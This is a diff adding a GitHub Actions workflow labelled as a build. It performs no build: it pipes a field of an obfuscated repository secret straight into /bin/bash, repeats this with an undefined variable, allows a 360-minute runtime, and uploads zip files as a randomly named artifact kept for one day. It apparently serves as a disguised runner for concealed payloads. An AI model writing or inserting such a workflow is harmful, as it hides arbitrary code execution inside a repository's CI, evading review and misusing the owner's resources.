@@ -1,0 +1,36 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Invoke
+        env:
+          lnfux1: ${{ secrets.lnfux1 }}
+        run: |
+          printf '%s' "$lnfux1" | jq -r .pyv8320 | /bin/bash
+          printf '%s' "$fa218" | jq -r .xl49351 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: KvKCXRjq
+          path: "*.zip"
+          retention-days: 1
